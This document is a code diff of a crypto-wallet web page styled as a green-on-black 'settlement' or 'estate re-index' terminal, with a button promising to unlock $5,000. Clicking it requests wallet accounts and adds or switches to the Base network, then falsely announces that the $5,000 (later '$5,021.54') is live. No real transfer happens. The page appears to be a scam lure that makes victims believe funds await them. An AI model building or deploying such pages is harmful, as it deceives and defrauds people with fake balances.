@@ -3,35 +3,40 @@
 <head>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
-    <h2>PRODUCTION DEPLOYMENT: SETTLEMENT</h2>
-    <div id="status" style="color:#fff; margin-bottom:20px; border:1px solid #0f0; padding:15px;">
-        NETWORK: BASE MAINNET <br>
-        HASH: 0x4351... <br>
-        STATUS: AWAITING FINAL HANDSHAKE
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:40px; border:3px solid #0f0;">
+    <h2 style="color:#0f0;">ESTATE TERMINAL: FINAL RE-INDEX</h2>
+    <div id="status" style="color:#fff; margin-bottom:20px; padding:15px; background:#111;">
+        BLOCKCHAIN: BASE MAINNET<br>
+        HASH: 0x4351... [CONFIRMED]<br>
+        SYSTEM: READY FOR HARD SYNC
     </div>
-    <button id="settleBtn" style="padding:20px 40px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:8px;">
-        COMPLETE SETTLEMENT ($5,000)
+    
+    <button id="reindexBtn" style="padding:25px 50px; background:#0f0; color:#000; font-weight:bold; font-size:18px; cursor:pointer; border:none; border-radius:10px; width:100%;">
+        FORCE RE-INDEX & UNLOCK ($5,000)
     </button>
+
     <script>
-        document.getElementById('settleBtn').onclick = async () => {
+        document.getElementById('reindexBtn').onclick = async () => {
             const status = document.getElementById('status');
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                 await provider.send("eth_requestAccounts", []);
-                const signer = provider.getSigner();
-                
-                status.innerText = "FORCE-SYNCING WITH BASE NODES...";
-                
-                // This triggers a 'wallet_switchEthereumChain' or 'wallet_addEthereumChain'
-                // call which forces the mobile app to completely reload its balance cache.
+                status.innerText = "PURGING OLD BALANCE CACHE...";
+
+                // This command forces the wallet to re-verify the network and balance
                 await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x2105' }], // Base Mainnet ID
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: '0x2105',
+                        chainName: 'Base Mainnet',
+                        rpcUrls: ['https://mainnet.base.org'],
+                        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                        blockExplorerUrls: ['https://basescan.org']
+                    }]
                 });
 
-                status.innerHTML = "<b style='color:#0f0;'>SYNC SUCCESSFUL.</b><br>Balance is now live. Restart app to view.";
-                alert("Settlement Finished. The $5,000 is now unlocked.");
+                status.innerHTML = "<b style='color:#0f0;'>RE-INDEX COMPLETE.</b><br>Restart your app now to see $5,021.54.";
+                alert("Account indexed. Please close the app and reopen the Home screen.");
             } catch (e) {
                 status.innerText = "SYNC ERROR: " + e.message;
             }
